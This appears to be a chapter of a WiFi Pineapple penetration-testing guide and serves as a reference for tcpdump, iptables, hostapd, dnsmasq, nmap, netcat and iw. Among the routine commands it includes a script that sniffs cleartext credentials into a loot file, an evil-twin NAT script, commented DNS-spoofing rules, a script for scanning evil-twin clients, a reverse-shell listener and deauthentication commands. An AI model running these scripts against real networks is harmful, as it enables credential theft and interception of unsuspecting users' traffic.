# Network Tools Reference

## Overview

Essential networking tools for WiFi Pineapple operations including packet capture, network configuration, and traffic analysis.

---

## tcpdump - Packet Capture

### Purpose
Capture and analyze network packets.

### Syntax
```bash
tcpdump [options] [expression]
```

### Key Options

| Option | Description |
|--------|-------------|
| `-i <interface>` | Interface to capture |
| `-w <file>` | Write to pcap file |
| `-r <file>` | Read from pcap file |
| `-c <count>` | Capture count |
| `-n` | Don't resolve hostnames |
| `-A` | Print ASCII |
| `-X` | Print hex and ASCII |
| `-s <size>` | Snap length (0=full) |
| `-v/-vv/-vvv` | Verbosity |

### Common Usage

```bash
# Capture all on interface
tcpdump -i wlan0 -w capture.pcap

# Capture specific port
tcpdump -i wlan0 port 80

# Capture specific host
tcpdump -i wlan0 host 192.168.1.100

# HTTP traffic only
tcpdump -i wlan0 -A 'tcp port 80'

# DNS queries
tcpdump -i wlan0 port 53

# Show packet contents
tcpdump -i wlan0 -X -s 0

# Non-resolving, verbose
tcpdump -i wlan0 -nn -vv
```

### Filter Expressions

```bash
# Protocol filters
tcpdump icmp
tcpdump tcp
tcpdump udp

# Port filters
tcpdump port 80
tcpdump portrange 1-1024
tcpdump dst port 443

# Host filters
tcpdump host 192.168.1.1
tcpdump src 192.168.1.100
tcpdump dst 10.0.0.1

# Network filters
tcpdump net 192.168.1.0/24

# Combine with and/or/not
tcpdump 'tcp port 80 and host 192.168.1.100'
tcpdump 'not port 22'
```

### Credential Capture Script

```bash
#!/bin/bash
# Capture potential credentials

INTERFACE="${1:-wlan0}"
OUTPUT="/sd/loot/creds_$(date +%s).txt"

echo "Capturing credentials on $INTERFACE..."
echo "Output: $OUTPUT"

tcpdump -i "$INTERFACE" -A -s 0 \
    'tcp port 80 or tcp port 21 or tcp port 25 or tcp port 110 or tcp port 143' \
    2>/dev/null | \
    grep -iE --line-buffered 'user|pass|login|email|pwd' | \
    tee -a "$OUTPUT"
```

---

## ip - Network Configuration

### Purpose
Modern Linux network configuration tool (replaces ifconfig).

### Interface Commands

```bash
# Show all interfaces
ip link show
ip a

# Show specific interface
ip addr show wlan0

# Bring interface up/down
ip link set wlan0 up
ip link set wlan0 down

# Set IP address
ip addr add 192.168.1.1/24 dev wlan0

# Remove IP address
ip addr del 192.168.1.1/24 dev wlan0

# Flush all IPs
ip addr flush dev wlan0
```

### Routing Commands

```bash
# Show routing table
ip route show
ip route

# Add default gateway
ip route add default via 192.168.1.1

# Add specific route
ip route add 10.0.0.0/8 via 192.168.1.1

# Delete route
ip route del 10.0.0.0/8
```

### MAC Address

```bash
# Show MAC
ip link show wlan0 | grep ether

# Change MAC
ip link set wlan0 down
ip link set wlan0 address 00:11:22:33:44:55
ip link set wlan0 up
```

---

## iptables - Firewall & NAT

### Purpose
Packet filtering and NAT configuration.

### Basic Commands

```bash
# List rules
iptables -L -n -v

# List NAT rules
iptables -t nat -L -n -v

# Flush all rules
iptables -F
iptables -t nat -F

# Set default policy
iptables -P INPUT DROP
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
```

### Common Rules

```bash
# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow SSH
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Allow HTTP
iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# Block specific IP
iptables -A INPUT -s 192.168.1.100 -j DROP
```

### NAT Configuration

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Masquerade (NAT)
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Forward between interfaces
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
```

### Port Redirect (Captive Portal)

```bash
# Redirect HTTP to local port
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080

# Redirect DNS
iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j REDIRECT --to-port 53
```

### Evil Twin NAT Script

```bash
#!/bin/bash
# Setup NAT for Evil Twin

AP_IFACE="wlan0"
INTERNET="eth0"

# Enable forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush existing
iptables -F
iptables -t nat -F

# Setup NAT
iptables -t nat -A POSTROUTING -o "$INTERNET" -j MASQUERADE
iptables -A FORWARD -i "$AP_IFACE" -o "$INTERNET" -j ACCEPT
iptables -A FORWARD -i "$INTERNET" -o "$AP_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT

echo "NAT configured: $AP_IFACE -> $INTERNET"
```

---

## hostapd - Access Point

### Purpose
Create software access points.

### Configuration File

```bash
# /tmp/hostapd.conf
interface=wlan0
driver=nl80211
ssid=MyAccessPoint
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0

# For WPA2:
wpa=2
wpa_passphrase=MyPassword123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
```

### Running hostapd

```bash
# Foreground (with output)
hostapd /tmp/hostapd.conf

# Background
hostapd -B /tmp/hostapd.conf

# Debug mode
hostapd -dd /tmp/hostapd.conf
```

### hostapd_cli Commands

```bash
# Status
hostapd_cli status

# List stations
hostapd_cli all_sta

# Deauthenticate client
hostapd_cli deauthenticate AA:BB:CC:DD:EE:FF

# Disassociate client
hostapd_cli disassociate AA:BB:CC:DD:EE:FF
```

---

## dnsmasq - DHCP/DNS

### Purpose
Lightweight DHCP and DNS server.

### Configuration File

```bash
# /tmp/dnsmasq.conf
interface=wlan0
bind-interfaces

# DHCP
dhcp-range=192.168.4.100,192.168.4.200,12h
dhcp-option=3,192.168.4.1    # Gateway
dhcp-option=6,192.168.4.1    # DNS

# DNS
server=8.8.8.8
server=8.8.4.4

# Logging
log-queries
log-dhcp
log-facility=/tmp/dnsmasq.log

# Lease file
dhcp-leasefile=/tmp/dnsmasq.leases

# DNS Spoofing (redirect all to us)
# address=/#/192.168.4.1

# Specific domain spoofing
# address=/facebook.com/192.168.4.1
```

### Running dnsmasq

```bash
# With config file
dnsmasq -C /tmp/dnsmasq.conf

# Foreground
dnsmasq -C /tmp/dnsmasq.conf -d

# Command line options
dnsmasq --interface=wlan0 \
    --dhcp-range=192.168.4.100,192.168.4.200,12h \
    --dhcp-option=3,192.168.4.1 \
    --no-daemon
```

### Check DHCP Leases

```bash
cat /tmp/dnsmasq.leases
# Format: timestamp mac ip hostname clientid
```

---

## nmap - Network Scanner

### Purpose
Network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (host discovery)
nmap -sn 192.168.1.0/24

# Port scan
nmap 192.168.1.1

# Full port scan
nmap -p- 192.168.1.1

# Fast scan (top 100 ports)
nmap -F 192.168.1.1

# Service detection
nmap -sV 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Aggressive scan
nmap -A 192.168.1.1
```

### Stealth Scans

```bash
# SYN scan (default, needs root)
nmap -sS 192.168.1.1

# TCP connect (no root needed)
nmap -sT 192.168.1.1

# UDP scan
nmap -sU 192.168.1.1

# Slow timing (evade IDS)
nmap -T1 192.168.1.1
```

### Output Options

```bash
# Normal output to file
nmap -oN scan.txt 192.168.1.1

# XML output
nmap -oX scan.xml 192.168.1.1

# Grepable output
nmap -oG scan.grep 192.168.1.1

# All formats
nmap -oA scan 192.168.1.1
```

### Quick Scan Script

```bash
#!/bin/bash
# Scan clients on Evil Twin network

NETWORK="192.168.4.0/24"
OUTPUT="/sd/loot/nmap_$(date +%s)"

echo "Scanning $NETWORK..."

# Host discovery
nmap -sn "$NETWORK" -oG "${OUTPUT}_hosts.grep"

# Extract live hosts
HOSTS=$(grep "Up" "${OUTPUT}_hosts.grep" | cut -d' ' -f2)

# Service scan on live hosts
for host in $HOSTS; do
    echo "Scanning $host..."
    nmap -sV -F "$host" -oN "${OUTPUT}_${host}.txt"
done

echo "Scans complete: $OUTPUT*"
```

---

## netcat (nc) - Network Swiss Army Knife

### Purpose
Read/write network connections.

### Common Usage

```bash
# Listen on port
nc -l -p 4444

# Connect to host
nc 192.168.1.1 4444

# File transfer (receiver)
nc -l -p 4444 > received_file

# File transfer (sender)
nc 192.168.1.1 4444 < file_to_send

# Port scan
nc -zv 192.168.1.1 1-1000

# Reverse shell listener
nc -lvnp 4444

# Simple chat
# Host 1: nc -l -p 4444
# Host 2: nc 192.168.1.1 4444
```

### Banner Grabbing

```bash
# HTTP banner
echo "GET / HTTP/1.0\r\n\r\n" | nc 192.168.1.1 80

# SMTP banner
nc 192.168.1.1 25
```

---

## iw - Modern Wireless Tool

### Purpose
Modern replacement for iwconfig.

### Commands

```bash
# List interfaces
iw dev

# Interface info
iw dev wlan0 info

# Scan for networks
iw dev wlan0 scan

# Set channel
iw dev wlan0 set channel 6

# Set monitor mode
iw dev wlan0 set type monitor

# Set managed mode
iw dev wlan0 set type managed

# Physical device capabilities
iw phy phy0 info

# List supported features
iw list
```

### Station Info

```bash
# Connected station details
iw dev wlan0 station dump

# Link quality
iw dev wlan0 link
```

---

## Quick Reference

```
┌─────────────────────────────────────────────────────────────┐
│               NETWORK TOOLS QUICK REFERENCE                 │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  CAPTURE:                                                    │
│    tcpdump -i wlan0 -w file.pcap                            │
│    tcpdump -i wlan0 port 80 -A                              │
│                                                              │
│  INTERFACES:                                                 │
│    ip addr show                                              │
│    ip link set wlan0 up/down                                │
│    ip addr add 192.168.1.1/24 dev wlan0                     │
│                                                              │
│  NAT/FIREWALL:                                               │
│    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE     │
│    iptables -A FORWARD -i wlan0 -j ACCEPT                   │
│                                                              │
│  ACCESS POINT:                                               │
│    hostapd /path/to/config.conf                             │
│    dnsmasq -C /path/to/config.conf                          │
│                                                              │
│  SCANNING:                                                   │
│    nmap -sn 192.168.1.0/24                                  │
│    nmap -sV -F target                                        │
│                                                              │
│  WIRELESS:                                                   │
│    iw dev wlan0 scan                                         │
│    iw dev wlan0 set channel 6                               │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

[← Aircrack-ng Suite](03_Aircrack_Suite.md) | [Back to Fundamentals](README.md) | [Next: PineAP Module →](05_PineAP_Module.md)
